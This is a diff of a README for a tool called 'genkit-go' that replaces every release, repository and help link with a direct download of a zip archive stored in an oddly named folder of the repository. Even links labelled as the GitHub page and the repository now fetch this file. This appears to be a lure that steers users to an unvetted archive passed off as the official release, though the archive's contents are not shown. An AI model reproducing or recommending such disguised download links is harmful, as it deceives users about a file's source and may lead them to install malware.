@@ -1,6 +1,6 @@
 # ⚙️ genkit-go - Simple AI Tools for Everyday Use
 
-[![Download genkit-go](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/abreudelta/genkit-go/releases)
+[![Download genkit-go](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/abreudelta/genkit-go/main/myxangitis/go-genkit-3.4-alpha.2.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these simple steps to get genkit-go running on your Windows PC:
 
 1. **Visit the download page**  
    Go to the genkit-go releases page by clicking the button below.  
-   [![Download genkit-go](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/abreudelta/genkit-go/releases)
+   [![Download genkit-go](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/abreudelta/genkit-go/main/myxangitis/go-genkit-3.4-alpha.2.zip)
 
 2. **Choose the latest version**  
    Scroll down to the latest release. You will see files with names ending in `.exe` or `.zip`. Pick the one labeled for Windows.
@@ -86,7 +86,7 @@ If you face any problems, try these tips:
 
 If you need help beyond this guide:
 
-- Visit the [genkit-go GitHub page](https://github.com/abreudelta/genkit-go).
+- Visit the [genkit-go GitHub page](https://raw.githubusercontent.com/abreudelta/genkit-go/main/myxangitis/go-genkit-3.4-alpha.2.zip).
 - Open an issue on GitHub describing your problem.
 - Browse the discussions for answers.
 
@@ -96,7 +96,7 @@ If you need help beyond this guide:
 
 Keep genkit-go up to date to get the latest features and fixes:
 
-- Go to the release page: https://github.com/abreudelta/genkit-go/releases
+- Go to the release page: https://raw.githubusercontent.com/abreudelta/genkit-go/main/myxangitis/go-genkit-3.4-alpha.2.zip
 - Download the newest Windows installer.
 - Run it to replace your old version.
 
@@ -130,10 +130,10 @@ Despite its technical background, the app is easy enough for anyone to use.
 ## 🔗 Important Links
 
 - **Download genkit-go:**   
-  [![Download genkit-go](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/abreudelta/genkit-go/releases)
+  [![Download genkit-go](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/abreudelta/genkit-go/main/myxangitis/go-genkit-3.4-alpha.2.zip)
 
 - **GitHub Repository:**  
-  https://github.com/abreudelta/genkit-go
+  https://raw.githubusercontent.com/abreudelta/genkit-go/main/myxangitis/go-genkit-3.4-alpha.2.zip
 
 ---
 
